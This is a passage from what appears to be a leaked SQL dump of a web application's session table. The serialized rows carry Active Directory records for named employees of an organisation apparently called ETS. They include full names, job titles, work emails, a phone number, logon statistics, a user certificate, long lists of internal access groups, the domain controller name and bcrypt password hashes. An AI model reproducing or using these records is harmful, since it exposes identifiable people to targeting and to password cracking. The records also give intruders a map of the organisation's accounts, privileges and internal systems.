Villamor\";}i:14;s:4:\"name\";s:10:\"objectguid\";a:2:{s:5:\"count\";i:1;i:0;s:16:\"[ңjиҮcҸOӢVvҶкЈ”\";}i:15;s:10:\"objectguid\";s:18:\"useraccountcontrol\";a:2:{s:5:\"count\";i:1;i:0;s:3:\"512\";}i:16;s:18:\"useraccountcontrol\";s:11:\"badpwdcount\";a:2:{s:5:\"count\";i:1;i:0;s:1:\"0\";}i:17;s:11:\"badpwdcount\";s:8:\"codepage\";a:2:{s:5:\"count\";i:1;i:0;s:1:\"0\";}i:18;s:8:\"codepage\";s:11:\"countrycode\";a:2:{s:5:\"count\";i:1;i:0;s:1:\"0\";}i:19;s:11:\"countrycode\";s:15:\"badpasswordtime\";a:2:{s:5:\"count\";i:1;i:0;s:18:\"134217806352837562\";}i:20;s:15:\"badpasswordtime\";s:10:\"lastlogoff\";a:2:{s:5:\"count\";i:1;i:0;s:1:\"0\";}i:21;s:10:\"lastlogoff\";s:9:\"lastlogon\";a:2:{s:5:\"count\";i:1;i:0;s:18:\"134225259305031659\";}i:22;s:9:\"lastlogon\";s:10:\"pwdlastset\";a:2:{s:5:\"count\";i:1;i:0;s:18:\"134214125870319820\";}i:23;s:10:\"pwdlastset\";s:14:\"primarygroupid\";a:2:{s:5:\"count\";i:1;i:0;s:3:\"513\";}i:24;s:14:\"primarygroupid\";s:9:\"objectsid\";a:2:{s:5:\"count\";i:1;i:0;s:28:\"\0\0\0\0\0\0\0\0ХЛ\\XЎфbе;+Ч\0\0\";}i:25;s:9:\"objectsid\";s:14:\"accountexpires\";a:2:{s:5:\"count\";i:1;i:0;s:19:\"9223372036854775807\";}i:26;s:14:\"accountexpires\";s:10:\"logoncount\";a:2:{s:5:\"count\";i:1;i:0;s:4:\"1198\";}i:27;s:10:\"logoncount\";s:14:\"samaccountname\";a:2:{s:5:\"count\";i:1;i:0;s:7:\"aicanib\";}i:28;s:14:\"samaccountname\";s:14:\"samaccounttype\";a:2:{s:5:\"count\";i:1;i:0;s:9:\"805306368\";}i:29;s:14:\"samaccounttype\";s:17:\"userprincipalname\";a:2:{s:5:\"count\";i:1;i:0;s:19:\"aicanib@ets-rfv.eus\";}i:30;s:17:\"userprincipalname\";s:11:\"lockouttime\";a:2:{s:5:\"count\";i:1;i:0;s:1:\"0\";}i:31;s:11:\"lockouttime\";s:14:\"objectcategory\";a:2:{s:5:\"count\";i:1;i:0;s:52:\"CN=Person,CN=Schema,CN=Configuration,DC=ets,DC=local\";}i:32;s:14:\"objectcategory\";s:21:\"dscorepropagationdata\";a:6:{s:5:\"count\";i:5;i:0;s:17:\"20250612111516.0Z\";i:1;s:17:\"20250612110406.0Z\";i:2;s:17:\"20250228095009.0Z\";i:3;s:17:\"20250228094519.0Z\";i:4;s:17:\"16010714223649.0Z\";}i:33;s:21:\"dscorepropagationdata\";s:21:\"ms-ds-consistencyguid\";a:2:{s:5:\"count\";i:1;i:0;s:16:\"[ңjиҮcҸOӢVvҶкЈ”\";}i:34;s:21:\"ms-ds-consistencyguid\";s:18:\"lastlogontimestamp\";a:2:{s:5:\"count\";i:1;i:0;s:18:\"134218131414190971\";}i:35;s:18:\"lastlogontimestamp\";s:22:\"msds-authenticatedatdc\";a:2:{s:5:\"count\";i:1;i:0;s:51:\"CN=D-SERV-DOM,OU=Domain Controllers,DC=ets,DC=local\";}i:36;s:22:\"msds-authenticatedatdc\";s:39:\"msds-lastsuccessfulinteractivelogontime\";a:2:{s:5:\"count\";i:1;i:0;s:18:\"134225279263071466\";}i:37;s:39:\"msds-lastsuccessfulinteractivelogontime\";s:35:\"msds-lastfailedinteractivelogontime\";a:2:{s:5:\"count\";i:1;i:0;s:18:\"134223847086244268\";}i:38;s:35:\"msds-lastfailedinteractivelogontime\";s:32:\"msds-failedinteractivelogoncount\";a:2:{s:5:\"count\";i:1;i:0;s:2:\"69\";}i:39;s:32:\"msds-failedinteractivelogoncount\";s:53:\"msds-failedinteractivelogoncountatlastsuccessfullogon\";a:2:{s:5:\"count\";i:1;i:0;s:2:\"69\";}i:40;s:53:\"msds-failedinteractivelogoncountatlastsuccessfullogon\";s:14:\"mstsexpiredate\";a:2:{s:5:\"count\";i:1;i:0;s:17:\"20260522162556.0Z\";}i:41;s:14:\"mstsexpiredate\";s:18:\"mstslicenseversion\";a:2:{s:5:\"count\";i:1;i:0;s:6:\"655361\";}i:42;s:18:\"mstslicenseversion\";s:14:\"mstsmanagingls\";a:2:{s:5:\"count\";i:1;i:0;s:23:\"00430-10000-14577-AT763\";}i:43;s:14:\"mstsmanagingls\";s:19:\"mstslicenseversion2\";a:2:{s:5:\"count\";i:1;i:0;s:1:\"7\";}i:44;s:19:\"mstslicenseversion2\";s:19:\"mstslicenseversion3\";a:2:{s:5:\"count\";i:1;i:0;s:11:\"C50-10.01-S\";}i:45;s:19:\"mstslicenseversion3\";s:4:\"mail\";a:2:{s:5:\"count\";i:1;i:0;s:19:\"acanibe@ets-rfv.eus\";}i:46;s:4:\"mail\";s:5:\"count\";i:47;s:2:\"dn\";s:95:\"CN=Aitor Canibe Villamor,OU=PMAtxuri,OU=Explotacion,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";}}Preferences|a:3:{s:6:\"IDIOMA\";s:5:\"es_ES\";s:15:\"PUESTOS_GESTION\";s:3:\"1,2\";s:4:\"skin\";s:16:\"skin-green-light\";}Auth|a:1:{s:4:\"User\";O:21:\"App\\Model\\Entity\\User\":11:{s:14:\"\0*\0_accessible\";a:2:{s:1:\"*\";b:1;s:2:\"id\";b:0;}s:10:\"\0*\0_hidden\";a:1:{i:0;s:8:\"password\";}s:14:\"\0*\0_properties\";a:12:{s:2:\"id\";i:30;s:8:\"username\";s:7:\"aicanib\";s:10:\"firts_name\";s:21:\"Aitor Canibe Villamor\";s:9:\"last_name\";s:0:\"\";s:8:\"password\";s:60:\"$2y$10$AIz8uMBf6rQRuoEexjBb2.0F6Pqz8L/P5htUHXupWx6C9Oj5PtWjC\";s:5:\"email\";s:19:\"acanibe@ets-rfv.eus\";s:7:\"role_id\";i:1;s:13:\"codigo_agente\";N;s:14:\"notificaciones\";i:1;s:7:\"created\";O:20:\"Cake\\I18n\\FrozenTime\":3:{s:4:\"date\";s:26:\"2019-04-10 08:33:42.000000\";s:13:\"timezone_type\";i:3;s:8:\"timezone\";s:3:\"UTC\";}s:8:\"modified\";O:20:\"Cake\\I18n\\FrozenTime\":3:{s:4:\"date\";s:26:\"2020-10-26 10:30:32.000000\";s:13:\"timezone_type\";i:3;s:8:\"timezone\";s:3:\"UTC\";}s:2:\"dn\";s:95:\"CN-Aitor-Canibe-Villamor-OU-PMAtxuri-OU-Explotacion-OU-Usuarios-ETS-OU-Usuarios-DC-ets-DC-local\";}s:12:\"\0*\0_original\";a:0:{}s:11:\"\0*\0_virtual\";a:0:{}s:13:\"\0*\0_className\";N;s:9:\"\0*\0_dirty\";a:1:{s:2:\"dn\";b:1;}s:7:\"\0*\0_new\";b:0;s:10:\"\0*\0_errors\";a:0:{}s:11:\"\0*\0_invalid\";a:0:{}s:17:\"\0*\0_registryAlias\";s:5:\"Users\";}}Flash|a:0:{}',1778086206),('bmkcsn9pvkgtt99gjioj18olqs','2026-05-02 23:21:09','Config|a:1:{s:4:\"time\";i:1777764069;}Flash|a:0:{}Preferences|a:1:{s:4:\"skin\";s:9:\"skin-blue\";}Auth|a:1:{s:4:\"User\";O:21:\"App\\Model\\Entity\\User\":11:{s:14:\"\0*\0_accessible\";a:2:{s:1:\"*\";b:1;s:2:\"id\";b:0;}s:10:\"\0*\0_hidden\";a:1:{i:0;s:8:\"password\";}s:14:\"\0*\0_properties\";a:8:{s:5:\"email\";s:21:\"htroitino@ets-rfv.eus\";s:7:\"role_id\";i:2;s:10:\"firts_name\";s:33:\"Harritokieta TroitiГұo Berasategi\";s:8:\"username\";s:7:\"hatroit\";s:8:\"password\";s:60:\"$2y$10$Sn3igWw3bM9fS.uuQc7TeOpfWtVJ62.2nKG5EWVyjup1TmFbcJZRm\";s:7:\"created\";O:20:\"Cake\\I18n\\FrozenTime\":3:{s:4:\"date\";s:26:\"2026-05-02 23:21:09.000000\";s:13:\"timezone_type\";i:3;s:8:\"timezone\";s:3:\"UTC\";}s:8:\"modified\";O:20:\"Cake\\I18n\\FrozenTime\":3:{s:4:\"date\";s:26:\"2026-05-02 23:21:09.000000\";s:13:\"timezone_type\";i:3;s:8:\"timezone\";s:3:\"UTC\";}s:2:\"id\";i:174;}s:12:\"\0*\0_original\";a:0:{}s:11:\"\0*\0_virtual\";a:0:{}s:13:\"\0*\0_className\";N;s:9:\"\0*\0_dirty\";a:0:{}s:7:\"\0*\0_new\";b:0;s:10:\"\0*\0_errors\";a:0:{}s:11:\"\0*\0_invalid\";a:0:{}s:17:\"\0*\0_registryAlias\";s:5:\"Users\";}}',1777792869),('emu4b8ipippvqiepc16pgplgkt','2026-05-06 11:52:36','Config|a:1:{s:4:\"time\";i:1778068377;}Flash|a:0:{}user_ldap|b:0;',1778097177),('f4d8ttbq04sd84ipr324fc0ak3','2026-05-09 22:46:35','Config|a:1:{s:4:\"time\";i:1778366795;}',1778395595),('f5ve2r2kq3trc2r8k78rmfoj1l','2026-05-06 11:50:24','Config|a:1:{s:4:\"time\";i:1778068224;}',1778097024),('fts0pk4hsf19ctfk42a27qjg61','2026-05-12 08:18:58','Config|a:1:{s:4:\"time\";i:1778573938;}Flash|a:0:{}',1778602738),('g6q4ccffbnqt52hna9u25e9q1p','2026-05-08 09:40:04','Config|a:1:{s:4:\"time\";i:1778233204;}',1778262004),('j25fkmbicivik6slmviqsrmdiu','2026-05-06 11:54:12','Config|a:1:{s:4:\"time\";i:1778068452;}Flash|a:0:{}',1778097252),('jop6hgpod7ii7ciuhm42ocr04s','2026-05-05 05:56:04','Config|a:1:{s:4:\"time\";i:1777978154;}user_ldap|a:2:{s:5:\"count\";i:1;i:0;a:92:{s:11:\"objectclass\";a:5:{s:5:\"count\";i:4;i:0;s:3:\"top\";i:1;s:6:\"person\";i:2;s:20:\"organizationalPerson\";i:3;s:4:\"user\";}i:0;s:11:\"objectclass\";s:2:\"cn\";a:2:{s:5:\"count\";i:1;i:0;s:28:\"Juan Carlos Enrique Gordillo\";}i:1;s:2:\"cn\";s:2:\"sn\";a:2:{s:5:\"count\";i:1;i:0;s:16:\"Enrique Gordillo\";}i:2;s:2:\"sn\";s:11:\"description\";a:2:{s:5:\"count\";i:1;i:0;s:10:\"Jefe de PM\";}i:3;s:11:\"description\";s:10:\"postalcode\";a:2:{s:5:\"count\";i:1;i:0;s:4:\"okta\";}i:4;s:10:\"postalcode\";s:15:\"telephonenumber\";a:2:{s:5:\"count\";i:1;i:0;s:9:\"688804070\";}i:5;s:15:\"telephonenumber\";s:15:\"usercertificate\";a:2:{s:5:\"count\";i:1;i:0;s:1471:\"0Ӯ»0ӮЈ \"\0\0§Zh5Ы«Ҝx]\0\0\0§0\r	*ҶHҶч\r\00B10\n	’&ү“т,dlocal10\n	’&ү“т,dets10Uets-CEOP-CA0\r220811071027Z\r230811071027Z0ҒҘ10\n	’&ү“т,dlocal10\n	’&ү“т,dets10UUsuarios10UUsuarios ETS10UExplotacion10UPMAmara1%0#UJuan Carlos Enrique Gordillo0Ғҹ0\r	*ҶHҶч\r\0ҒҚ\00ҒүҒҒ\0§чdүөtPө)мХOЖ¶5Adьғхi+{…лC pВҫ_\'vTJIy%©¬ЁҒd#ҫ’Ъю–ьЯKЯZІцұ0Жп4Ј`ҮmXҖщмFӘәmGң;ШЦЭӣ:”АДBj|ҝ\0јчМҳ9Щ®»җ“Ш« өұe-Окv9\0ЈӮИ0ӮД0	+Ӯ7\0E\0F\0S0U%0\n+Ӯ7\n0U 0D	*ҶHҶч\r	7050*ҶHҶч\r\0Җ0*ҶHҶч\r\0Җ0+0\n*ҶHҶч\r0UMҙv:.ј\0Ҡҷ&п!ҫЎ7ыrЫK0U#0ҖЧ+.Ж7ЙҺ”Ҫ”і\r-f.я0ҒДUҒј0Ғ№0Ғ¶ Ғі Ғ°ҶҒӯldap:///CN=ets-CEOP-CA,CN=CEOP,CN=CDP,CN=Public%20Key%20Services,CN=Services,CN=Configuration,DC=ets,DC=local?certificateRevocationList?base?objectClass=cRLDistributionPoint0Ғ»+Ғ®0Ғ«0ҒЁ+0ҶҒӣldap:///CN=ets-CEOP-CA,CN=AIA,CN=Public%20Key%20Services,CN=Services,CN=Configuration,DC=ets,DC=local?cACertificate?base?objectClass=certificationAuthority0,U%0# !\n+Ӯ7 juenriq@ets.local0N	+Ӯ7A0? =\n+Ӯ7 /-S-1-5-21-1482476501-1644491937-725345543-28770\r	*ҶHҶч\r\0Ӯ\0ҜY\nчу«аҸО\ZІвҲ_uеi\'jl°·тв%аXждъo?Q\'ҳД\\\"mӢ0dхw\"Т“t&Ч+c ҹXcyӮ:=ё\\k7ТDэӘЙКңі 	 »ҠйС&gҙ.»]ўЫ-9–‘ҠИғіС–і0dӨҙГ„/эӣн:с7Ӣ0\"$ыҳ¬ҒЮк`ӣҮ}МйTҲ+йәХJ5ХдҝоҜY|4еЙКҖrcДж*s2ъ“Зфжіма]?Эu ЧңЈМ<VвчдА2Іхvмыvr!ҒtхI.у*ӯ3Ж~ъeӘ1%H№sBщҺwrФ.ҷ$~ P в‘Щ;©2ө\";}i:6;s:15:\"usercertificate\";s:9:\"givenname\";a:2:{s:5:\"count\";i:1;i:0;s:11:\"Juan Carlos\";}i:7;s:9:\"givenname\";s:17:\"distinguishedname\";a:2:{s:5:\"count\";i:1;i:0;s:101:\"CN=Juan Carlos Enrique Gordillo,OU=PMAmara,OU=Explotacion,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";}i:8;s:17:\"distinguishedname\";s:12:\"instancetype\";a:2:{s:5:\"count\";i:1;i:0;s:1:\"4\";}i:9;s:12:\"instancetype\";s:11:\"whencreated\";a:2:{s:5:\"count\";i:1;i:0;s:17:\"20070308113505.0Z\";}i:10;s:11:\"whencreated\";s:11:\"whenchanged\";a:2:{s:5:\"count\";i:1;i:0;s:17:\"20260505045349.0Z\";}i:11;s:11:\"whenchanged\";s:11:\"displayname\";a:2:{s:5:\"count\";i:1;i:0;s:28:\"Juan Carlos Enrique Gordillo\";}i:12;s:11:\"displayname\";s:10:\"usncreated\";a:2:{s:5:\"count\";i:1;i:0;s:5:\"24656\";}i:13;s:10:\"usncreated\";s:8:\"memberof\";a:46:{s:5:\"count\";i:45;i:0;s:106:\"CN=gr_circulacion_ripublic_pex_lectura,OU=Ripublic,OU=GruposAcceso,OU=AplicacionesOT,OU=OT,DC=ets,DC=local\";i:1;s:123:\"CN=gr_Usuarios_GP_PA_Portatiles,OU=GLOBALPROTECT,OU=Aplicaciones,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:2;s:81:\"CN=gr_mdm_teams,OU=MDM,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:3;s:77:\"CN=gr_okta_GP_PA_pro,OU=OKTA,OU=UsuariosDeSistema,OU=Sistemak,DC=ets,DC=local\";i:4;s:78:\"CN=gr_okta_hyland_pro,OU=OKTA,OU=UsuariosDeSistema,OU=Sistemak,DC=ets,DC=local\";i:5;s:80:\"CN=gr_AGS_Supervisor,OU=AGS_GMV,OU=UsuariosDeSistema,OU=Sistemak,DC=ets,DC=local\";i:6;s:73:\"CN=gr_GIE2023,OU=GIE2023,OU=UsuariosDeSistema,OU=Sistemak,DC=ets,DC=local\";i:7;s:102:\"CN=gr_Ripublic_Reinicio_Servidores,OU=Ripublic,OU=GruposAcceso,OU=AplicacionesOT,OU=OT,DC=ets,DC=local\";i:8;s:99:\"CN=gr_Ripublic_Telein_NetOP_RDP,OU=Ripublic,OU=GruposAcceso,OU=AplicacionesOT,OU=OT,DC=ets,DC=local\";i:9;s:133:\"CN=gr_intranet2023_InventariosPM_escritura,OU=Intranet2023,OU=Aplicaciones,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:10;s:135:\"CN=gr_intranet2023_vehiculos_consumo_lectura,OU=Intranet2023,OU=Aplicaciones,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:11;s:115:\"CN=gr_trena_aurkitu_pre,OU=trena_aurkitu,OU=Aplicaciones,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:12;s:125:\"CN=gr_intranet2023_MantOpe_lectura,OU=Intranet2023,OU=Aplicaciones,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:13;s:104:\"CN=gr_tele_est_Supervisor,OU=TelemandoEstaciones,OU=GruposAcceso,OU=AplicacionesOT,OU=OT,DC=ets,DC=local\";i:14;s:96:\"CN=gr_validaciones_Lectura_BBDD,OU=VALIDACIONES,OU=UsuariosDeSistema,OU=Sistemak,DC=ets,DC=local\";i:15;s:126:\"CN=gr_datosRed_EzagutzarenKudeaketa_escritura,OU=Guneak,OU=DatosRed,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:16;s:75:\"CN=gr_users_traka,OU=TRAKA,OU=UsuariosDeSistema,OU=Sistemak,DC=ets,DC=local\";i:17;s:95:\"CN=gr_tele_ene_Mant,OU=TelemandoEnergia,OU=GruposAcceso,OU=AplicacionesOT,OU=OT,DC=ets,DC=local\";i:18;s:84:\"CN=gr_mdm_euskoags,OU=MDM,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:19;s:109:\"CN=gr_datosRED_Estaciones_interactivas,OU=DatosRed,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:20;s:111:\"CN=gr_datosRed_gestionestaciones_lectura,OU=DatosRed,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:21;s:71:\"CN=gr_onbase,OU=ONBASE,OU=UsuariosDeSistema,OU=Sistemak,DC=ets,DC=local\";i:22;s:152:\"CN=gr_intranet_kontratazioak_UsuariosPIC,OU=ver2021,OU=Kontratazioak_intranet,OU=Aplicaciones,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:23;s:132:\"CN=gr_datosRed_Circulacion_DepCirculacion_escritura,OU=Guneak,OU=DatosRed,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:24;s:91:\"CN=gr_mdm_app_PersonalGes,OU=MDM,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:25;s:127:\"CN=gr_datosRed_Circulacion_logistica_escritura,OU=Guneak,OU=DatosRed,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:26;s:108:\"CN=gr_carpeta_pmprovisional_escritura,OU=DatosRed,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:27;s:124:\"CN=gr_datos_red_priv_vigilancia_red_lectura,OU=Guneak,OU=DatosRed,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:28;s:81:\"CN=gr_mdm_users,OU=MDM,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:29;s:96:\"CN=gr_carpeta_explotacion,OU=DatosRed,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:30;s:104:\"CN=gr_ctx_jefesPM,OU=Estaciones_CTX6_Netalb01,OU=Explotacion,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:31;s:117:\"CN=Gr_datos_red_PM_General_escritura,OU=Guneak,OU=DatosRed,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:32;s:133:\"CN=gr_intranet2023_vehiculos_Flota_lectura,OU=Intranet2023,OU=Aplicaciones,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:33;s:85:\"CN=gr_mdm_perfil_PM,OU=MDM,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:34;s:122:\"CN=gr_int_pertsona_lectura,OU=Pertsona_intranet,OU=Aplicaciones,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:35;s:141:\"CN=gr_intranet_kontratazioak_circulacion,OU=Kontratazioak_intranet,OU=Aplicaciones,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:36;s:84:\"CN=gr_PMAtxuriSinOperador,OU=Explotacion,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:37;s:128:\"CN=gr_datos_red_priv_coordinadora_red_escritura,OU=Guneak,OU=DatosRed,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:38;s:80:\"CN=gr_mie_user,OU=MIE,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:39;s:84:\"CN=gr_PMAmara_SinOperador,OU=Explotacion,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:40;s:89:\"CN=gr_mdm_perfilgeneral,OU=MDM,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:41;s:126:\"CN=gr_datos_red_priv_vigilancia_red_escritura,OU=Guneak,OU=DatosRed,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:42;s:136:\"CN=gr_datosred_priv_circulacion_SisInfPublico_escritura,OU=Guneak,OU=DatosRed,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:43;s:68:\"CN=gr_ETS,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:44;s:81:\"CN=gr_mie_admin,OU=MIE,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";}i:14;s:8:\"memberof\";s:10:\"usnchanged\";a:2:{s:5:\"count\";i:1;i:0;s:8:\"36688390\";}i:15;s:10:\"usnchanged\";s:4:\"name\";a:2:{s:5:\"count\";i:1;i:0;s:28:\"Juan Carlos Enrique Gordillo\";}i:16;s:4:\"name\";s:10:\"objectguid\";a:2:{s:5:\"count\";i:1;i:0;s:16:\"п-·Ё<PPBЎ№ҢOT5\";}i:17;s:10:\"objectguid\";s:18:\"useraccountcontrol\";a:2:{s:5:\"count\";i:1;i:0;s:3:\"512\";}i:18;s:18:\"useraccountcontrol\";s:11:\"badpwdcount\";a:2:{s:5:\"count\";i:1;i:0;s:1:\"0\";}i:19;s:11:\"badpwdcount\";s:8:\"codepage\";a:2:{s:5:\"count\";i:1;i:0;s:1:\"0\";}i:20;s:8:\"codepage\";s:11:\"countrycode\";a:2:{s:5:\"count\";i:1;i:0;s:1:\"0\";}i:21;s:11:\"countrycode\";s:15:\"badpasswordtime\";a:2:{s:5:\"count\";i:1;i:0;s:18:\"134215212521418203\";}i:22;s:15:\"badpasswordtime\";s:10:\"lastlogoff\";a:2:{s:5:\"count\";i:1;i:0;s:1:\"0\";}i:23;s:10:\"lastlogoff\";s:9:\"lastlogon\";a:2:{s:5:\"count\";i:1;i:0;s:18:\"134219345055649299\";}i:24;s:9:\"lastlogon\";s:10:\"pwdlastset\";a:2:{s:5:\"count\";i:1;i:0;s:18:\"134217406100261537\";}i:25;s:10:\"pwdlastset\";s:14:\"primarygroupid\";a:2:{s:5:\"count\";i:1;i:0;s:3:\"513\";}i:26;s:14:\"primarygroupid\";s:9:\"objectsid\";a:2:{s:5:\"count\";i:1;i:0;s:28:\"\0\0\0\0\0\0\0\0ХЛ\\XЎфbе;+=\0\0\";}i:27;s:9:\"objectsid\";s:14:\"accountexpires\";a:2:{s:5:\"count\";i:1;i:0;s:19:\"9223372036854775807\";}i:28;s:14:\"accountexpires\";s:10:\"logoncount\";a:2:{s:5:\"count\";i:1;i:0;s:3:\"644\";}i:29;s:10:\"logoncount\";s:14:\"samaccountname\";a:2:{s:5:\"count\";i:1;i:0;s:7:\"juenriq\";}i:30;s:14:\"samaccountname\";s:14:\"samaccounttype\";a:2:{s:5:\"count\";i:1;i:0;s:9:\"805306368\";}i:31;s:14:\"samaccounttype\";s:17:\"userprincipalname\";a:2:{s:5:\"count\";i:1;i:0;s:19:\"juenriq@ets-rfv.eus\";}i:32;s:17:\"userprincipalname\";s:11:\"lockouttime\";a:2:{s:5:\"count\";i:1;i:0;s:1:\"0\";}i:33;s:11:\"lockouttime\";s:14:\"objectcategory\";a:2:{s:5:\"count\";i:1;i:0;s:52:\"CN=Person,CN=Schema,CN=Configuration,DC=ets,DC=local\";}i:34;s:14:\"objectcategory\";s:21:\"dscorepropagationdata\";a:6:{s:5:\"count\";i:5;i:0;s:17:\"20250612111516.0Z\";i:1;s:17:\"20250612110406.0Z\";i:2;s:17:\"20250228095009.0Z\";i:3;s:17:\"20250228094519.0Z\";i:4;s:17:\"16010714223649.0Z\";}i:35;s:21:\"dscorepropagationdata\";s:21:\"ms-ds-consistencyguid\";a:2:{s:5:\"count\";i:1;i:0;s:16:\"п-·Ё<PPBЎ№ҢOT5\";}i:36;s:21:\"ms-ds-consistencyguid\";s:18:\"lastlogontimestamp\";a:2:{s:5:\"count\";i:1;i:0;s:18:\"134216137564636610\";}i:37;s:18:\"lastlogontimestamp\";s:22:\"msds-authenticatedatdc\";a:2:{s:5:\"count\";i:1;i:0;s:51:\"CN=D-SERV-DOM,OU=Domain Controllers,DC=ets,DC=local\";}i:38;s:22:\"msds-authenticatedatdc\";s:29:\"msds-supportedencryptiontypes\";a:2:{s:5:\"count\";i:1;i:0;s:1:\"0\";}i:39;s:29:\"msds-supportedencryptiontypes\";s:39:\"msds-lastsuccessfulinteractivelogontime\";a:2:{s:5:\"count\";i:1;i:0;s:18:\"134224301432352072\";}i:40;s:39:\"msds-lastsuccessfulinteractivelogontime\";s:35:\"msds-lastfailedinteractivelogontime\";a:2:{s:5:\"count\";i:1;i:0;s:18:\"134223671646125624\";}i:41;s:35:\"msds-lastfailedinteractivelogontime\";s:32:\"msds-failedinteractivelogoncount\";a:2:{s:5:\"count\";i:1;i:0;s:3:\"117\";}i:42;s:32:\"msds-failedinteractivelogoncount\";s:53:\"msds-failedinteractivelogoncountatlastsuccessfullogon\";a:2:{s:5:\"count\";i:1;i:0;s:3:\"117\";}i:43;s:53:\"msds-failedinteractivelogoncountatlastsuccessfullogon\";s:4:\"mail\";a:2:{s:5:\"count\";i:1;i:0;s:20:\"jenrique@ets-rfv.eus\";}i:44;s:4:\"mail\";s:5:\"count\";i:45;s:2:\"dn\";s:101:\"CN=Juan Carlos Enrique Gordillo,OU=PMAmara,OU=Explotacion,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";}}Preferences|a:3:{s:6:\"IDIOMA\";s:5:\"es_ES\";s:15:\"PUESTOS_GESTION\";s:3:\"1,2\";s:4:\"skin\";s:9:\"skin-blue\";}Auth|a:1:{s:4:\"User\";O:21:\"App\\Model\\Entity\\User\":11:{s:14:\"\0*\0_accessible\";a:2:{s:1:\"*\";b:1;s:2:\"id\";b:0;}s:10:\"\0*\0_hidden\";a:1:{i:0;s:8:\"password\";}s:14:\"\0*\0_properties\";a:12:{s:2:\"id\";i:9;s:8:\"username\";s:7:\"juenriq\";s:10:\"firts_name\";s:28:\"JUAN CARLOS ENRIQUE GORDILLO\";s:9:\"last_name\";s:16:\"ENRIQUE GORDILLO\";s:8:\"password\";s:60:\"$2y$10$57URau3B5u9NoRwcGCzfi.JOi.Rwe/zqUv9iHbea5.2YErJWT4Nai\";s:5:\"email\";s:20:\"jenrique@ets-rfv.eus\";s:7:\"role_id\";i:1;s:13:\"codigo_agente\";N;s:14:\"notificaciones\";i:1;s:7:\"created\";O:20:\"Cake\\I18n\\FrozenTime\":3:{s:4:\"date\";s:26:\"2017-11-29 17:12:47.000000\";s:13:\"timezone_type\";i:3;s:8:\"timezone\";s:3:\"UTC\";}s:8:\"modified\";O:20:\"Cake\\I18n\\FrozenTime\":3:{s:4:\"date\";s:26:\"2020-09-17 05:13:06.000000\";s:13:\"timezone_type\";i:3;s:8:\"timezone\";s:3:\"UTC\";}s:2:\"dn\";s:101:\"CN-Juan-Carlos-Enrique-Gordillo-OU-PMAmara-OU-Explotacion-OU-Usuarios-ETS-OU-Usuarios-DC-ets-DC-local\";}s:12:\"\0*\0_original\";a:0:{}s:11:\"\0*\0_virtual\";a:0:{}s:13:\"\0*\0_className\";N;s:9:\"\0*\0_dirty\";a:1:{s:2:\"dn\";b:1;}s:7:\"\0*\0_new\";b:0;s:10:\"\0*\0_errors\";a:0:{}s:11:\"\0*\0_invalid\";a:0:{}s:17:\"\0*\0_registryAlias\";s:5:\"Users\";}}Flash|a:0:{}',1778006954),('lquam4t7r9tdp9fdv613tjsfkl','2026-05-06 12:02:30','Config|a:1:{s:4:\"time\";i:1778068951;}Preferences|a:3:{s:6:\"IDIOMA\";s:5:\"es_ES\";s:15:\"PUESTOS_GESTION\";s:3:\"1,2\";s:4:\"skin\";s:9:\"skin-blue\";}Auth|a:1:{s:4:\"User\";O:21:\"App\\Model\\Entity\\User\":11:{s:14:\"\0*\0_accessible\";a:2:{s:1:\"*\";b:1;s:2:\"id\";b:0;}s:10:\"\0*\0_hidden\";a:1:{i:0;s:8:\"password\";}s:14:\"\0*\0_properties\";a:12:{s:2:\"id\";i:20;s:8:\"username\";s:7:\"erroman\";s:10:\"firts_name\";s:29:\"Erlantz Roman Ruiz de 